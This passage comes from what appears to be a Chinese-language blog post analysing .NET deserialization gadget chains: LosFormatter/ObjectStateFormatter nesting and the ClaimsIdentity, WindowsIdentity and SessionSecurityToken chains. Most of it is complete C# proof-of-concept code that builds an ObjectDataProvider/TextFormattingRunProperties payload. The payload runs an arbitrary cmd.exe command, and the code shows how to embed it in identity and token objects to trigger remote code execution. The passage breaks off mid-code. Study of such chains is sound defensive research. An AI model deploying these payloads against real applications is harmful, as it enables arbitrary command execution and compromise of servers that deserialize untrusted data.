alt="image-20240305112339413"></p><p>先从base64转字节数组，然后判断是否启用mac等。</p><p>LosFormatter交由ObjectStateFormatter反序列化处理，<strong>二次反序列化来进行处理</strong></p><h2 id="ClaimsIdentity"><a href="#ClaimsIdentity" class="headerlink" title="ClaimsIdentity"></a>ClaimsIdentity</h2><p>这里起的标题是这个ClaimsIdentity   但是等会接下来用的链子不会用到这个链子  只是说会用到这里类的反序列化流程</p><p><img src="../images/image-20240305143221444.png" alt="image-20240305143221444"></p><p><img src="../images/image-20240305143233918.png" alt="image-20240305143233918"></p><p>将自身m_bootstrapContext字段对象存放到<code>System.Security.ClaimsIdentity.bootstrapContext</code>中。而该字段是object类型。并且没有标记NonSerialized</p><p>此时写一个案例来看下当类自身字段<strong>(就是属性)</strong>值为object类型时的堆栈。 </p><p>(其实就是模拟上述ClaimsIdentity类的调用过程)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web.Security;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal();</span><br><span class="line">                My my = <span class="keyword">new</span> My();</span><br><span class="line">                my.o = textFormattingRunPropertiesMarshal;</span><br><span class="line">                losFormatter.Serialize(memory,my);</span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Deserialize(memory);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">My</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()at C:\Users\sdbdb\AppData\Roaming\JetBrains\Rider2022.1\resharper-host\DecompilerCache\decompiler\daf9a58f03a34857b2a38723152cb62e26c10\c9\edb1d909\TextFormattingRunProperties.cs:line 863</span><br><span class="line">new TextFormattingRunProperties()at C:\Users\sdbdb\AppData\Roaming\JetBrains\Rider2022.1\resharper-host\DecompilerCache\decompiler\daf9a58f03a34857b2a38723152cb62e26c10\c9\edb1d909\TextFormattingRunProperties.cs:line 119</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>仔细看的话在调用到<code>ObjectStateFormatter</code>这个类的时候  还会接着调用<code>BinaryFormatter</code>这个类来接着进行反序列化操作</p><p>那么至此可知，LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段。<strong>这也是ClaimsIdentity链的原理，套娃二次反序列化。</strong></p><p><strong>(给ClaimsIdentity的m_bootstrapContext参数传入对象的话  链子就会连起来)</strong></p><h2 id="WindowsIdentity"><a href="#WindowsIdentity" class="headerlink" title="WindowsIdentity"></a>WindowsIdentity</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            BinaryFormatter bf = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal();</span><br><span class="line">                bf.Serialize(memory, textFormattingRunPropertiesMarshal);</span><br><span class="line">                <span class="built_in">string</span> b64payload = Convert.ToBase64String(memory.ToArray());</span><br><span class="line">                WindowsIdentityIdentityMarshal windowsIdentityIdentityMarshal = <span class="keyword">new</span> WindowsIdentityIdentityMarshal(b64payload);</span><br><span class="line"></span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Serialize(memory, windowsIdentityIdentityMarshal);</span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Deserialize(memory);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">WindowsIdentityIdentityMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">WindowsIdentityIdentityMarshal</span>(<span class="params"><span class="built_in">string</span> b64payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            B64Payload = b64payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> B64Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(WindowsIdentity));</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsIdentity.actor&quot;</span>, B64Payload);</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsIdentity.bootstrapContext&quot;</span>, B64Payload);</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsIdentity.claims&quot;</span>, B64Payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是上面讲的那个<strong>ClaimsIdentity</strong>的子类   我们跟进这个类的反序列化函数中</p><p><img src="../images/image-20240305170131681.png" alt="image-20240305170131681"></p><p>其反序列化构造函数还继承了这个父类的反序列化构造函数</p><p><img src="../images/image-20240305170246677.png" alt="image-20240305170246677"></p><p>我们跟进这Deserialize方法中  </p><p><img src="../images/image-20240305170431050.png" alt="image-20240305170431050"></p><p>发现这里有很多case  都会先base64解码  然后放入到binary中进行反序列化操作</p><p><img src="../images/image-20240305170514665.png" alt="image-20240305170514665"></p><p>其参数就是ClaimsIdentity类中的参数  那么我们在序列化的时候给其赋值就行了</p><p>那么在info中设置key为System.Security.ClaimsIdentity.actor或bootstrapContext或claims，值为base64之后的TextFormattingRunPropertiesMarshal对象即可触发RCE。</p><h2 id="SessionSecurityToken"><a href="#SessionSecurityToken" class="headerlink" title="SessionSecurityToken"></a>SessionSecurityToken</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IdentityModel.Tokens;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">LosFormatterDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            LosFormatter losFormatter = <span class="keyword">new</span> LosFormatter();</span><br><span class="line">            BinaryFormatter bf = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal();</span><br><span class="line">                bf.Serialize(memory, textFormattingRunPropertiesMarshal);</span><br><span class="line">                <span class="built_in">string</span> b64payload = Convert.ToBase64String(memory.ToArray());</span><br><span class="line">                SessionSecurityTokenMarshal windowsIdentityIdentityMarshal = <span class="keyword">new</span> SessionSecurityTokenMarshal(b64payload);</span><br><span class="line"></span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Serialize(memory, windowsIdentityIdentityMarshal);</span><br><span class="line">                memory.Position = <span class="number">0</span>;</span><br><span class="line">                losFormatter.Deserialize(memory);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SessionSecurityTokenMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SessionSecurityTokenMarshal</span>(<span class="params"><span class="built_in">string</span> b64payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            B64Payload = b64payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> B64Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(SessionSecurityToken));</span><br><span class="line">            MemoryStream stream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (XmlDictionaryWriter xmlDictionaryWriter = XmlDictionaryWriter.CreateBinaryWriter(stream, <span class="literal">null</span>, <span class="literal">null</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;SecurityContextToken&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Version&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteValue(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteElementString(<span class="string">&quot;SecureConversationVersion&quot;</span>, <span class="string">&quot;&quot;</span>, (<span class="keyword">new</span> Uri(<span class="string">&quot;http://schemas.xmlsoap.org/ws/2005/02/sc&quot;</span>)).AbsoluteUri);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteElementString(<span class="string">&quot;Id&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">                WriteElementStringAsUniqueId(xmlDictionaryWriter, <span class="string">&quot;ContextId&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">                xmlDictionaryWriter.WriteStartElement(<span class="string">&quot;Key&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteBase64(<span class="keyword">new</span> <span class="built_in">byte</span>[] &#123; <span class="number">0x01</span> &#125;, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">                xmlDictionaryWriter.WriteEndElement();</span><br><span class="line"></span><br><span class="line">                WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;EffectiveTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;ExpiryTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                WriteElementContentAsInt64(xmlDictionaryWriter, <span class="string">&quot;KeyEffectiveTime&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                